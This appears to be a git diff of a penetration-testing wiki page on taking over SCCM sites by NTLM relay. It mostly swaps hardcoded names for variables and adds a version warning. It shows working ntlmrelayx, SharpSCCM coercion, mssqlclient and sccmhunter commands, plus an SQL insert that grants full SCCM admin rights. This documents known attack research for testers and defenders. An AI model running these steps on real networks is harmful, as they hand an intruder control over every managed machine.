@@ -120,10 +120,10 @@ From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [ntlmre
 
 ```bash
 # targetting MS-SQL
-ntlmrelayx.py -t "mssql://siteDatabase.domain.local" -smb2support -socks
+ntlmrelayx.py -t "mssql://siteDatabase.$DOMAIN" -smb2support -socks
 
 # targeting SMB
-ntlmrelayx.py -t "siteDatabase.domain.local" -smb2support -socks
+ntlmrelayx.py -t "siteDatabase.$DOMAIN" -smb2support -socks
 ```
 
 === Windows
@@ -136,20 +136,20 @@ For more insight on NTLM relay attacks and tools options, see the corresponding 
 
 #### Step 3: coerce authentication
 
-The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc.).
+The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-dfsnm.md), etc.).
 
 ::: tabs
 
 === UNIX-like
 
-From UNIX-like systems, authentication can be coerced through [PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc. (not based on triggering the client push installation).
+From UNIX-like systems, authentication can be coerced through [PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-dfsnm.md), etc. (not based on triggering the client push installation).
 
 There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).
 
 === Windows
 
 ```powershell
-SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.domain.local"
+SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.$DOMAIN"
 ```
 
 :::
@@ -161,7 +161,7 @@ The rest of this page is focusing on relaying the authentication on the MS-SQL s
 If the NTLM relay attack is a success and was targeting the MS-SQL service with SOCKS support, an SQL console could be obtained on the SCCM database through the opened socks proxy. From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (Python) can be used for that purpose.
 
 ```bash
-proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.domain.local" -windows-auth
+proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.$DOMAIN" -windows-auth
 ```
 
 Once the console is obtained, the attack can proceed to granting the user full privileges by running the following commands in the SQL console.
@@ -171,7 +171,7 @@ Once the console is obtained, the attack can proceed to granting the user full p
 use CM_<site_code>
 
 --Add the SID, the name of the current user, and the site code to the RBAC_Admins table
-INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,'DOMAIN\user',0,0,'','','','','<site_code>');
+INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,'$DOMAIN\$USER',0,0,'','','','','<site_code>');
 
 --Retrieve the AdminID of the added user
 SELECT AdminID,LogonName FROM RBAC_Admins;
@@ -195,6 +195,9 @@ Post exploitation via SCCM can now be performed on the network.
 
 ### Relay to the HTTP API AdminService
 
+> [!WARNING]
+> Starting with **Configuration Manager version 2509**, AdminService rejects NTLM authentication, which breaks this relay path. If you already hold valid admin credentials, authenticated abuse of the AdminService API remains possible.
+
 > [!CAUTION]
 > Some requirements are needed to perform the attack:
 > 
@@ -213,7 +216,7 @@ The target of the [NTLM relay attack](../../ntlm/relay.md) must be set to the SM
 From UNIX-like systems, [this PR](https://github.com/fortra/impacket/pull/1593) on [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.
 
 ```bash
-ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid $OBJECTSID
+ntlmrelayx.py -t "https://smsprovider.$DOMAIN/AdminService/wmi/SMS_Admin" -smb2support --adminservice --logonname "$DOMAIN\\$USER" --displayname "$DOMAIN\\$USER" --objectsid $OBJECTSID
 ```
 
 === Windows
@@ -226,20 +229,20 @@ For more insight on NTLM relay attacks and tools options, see the corresponding 
 
 #### Step 2: Authentication coercion
 
-The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc.).
+The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-dfsnm.md), etc.).
 
 ::: tabs
 
 === UNIX-like
 
-From UNIX-like systems, authentication can be coerced through [PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc. (not based on triggering the client push installation).
+From UNIX-like systems, authentication can be coerced through [PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-dfsnm.md), etc. (not based on triggering the client push installation).
 
 There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).
 
 === Windows
 
 ```powershell
-SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.domain.local"
+SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.$DOMAIN"
 ```
 
 :::
@@ -286,7 +289,7 @@ For more insight on NTLM relay attacks and tools options, see the corresponding 
 
 #### Step 2: authentication coercion
 
-The passive site server's authentication can be coerced with ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/ms-dfsnm.md), etc.).
+The passive site server's authentication can be coerced with ([PrinterBug](../../print-spooler-service/printerbug.md), [PetitPotam](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md), [ShadowCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-fsrvp.md), [DFSCoerce](../../mitm-and-coerced-authentications/rpc-coercions/ms-dfsnm.md), etc.).
 
 If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the active server, a SMB session through socks proxy has been opened with administrative rights.
 
@@ -305,7 +308,7 @@ Retrieve the LM:NT hash of the server account.
 Since the active site server must be a member of the SMS Provider administrators (it is member of the `SMS Admins` group), its credentials can be used to add a new controlled user to the `Full Admin` SCCM group. [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used for this purpose.
 
 ```bash
-sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:NTHASH -ip $SMS_PROVIDER_IP
+sccmhunter.py admin -u $ACTIVE_SERVER\$ -p "$LMHASH:$NT_HASH" -ip $SMS_PROVIDER_IP
 
 () (C:\) >> add_admin controlledUser 
 () (C:\) >> show_admins
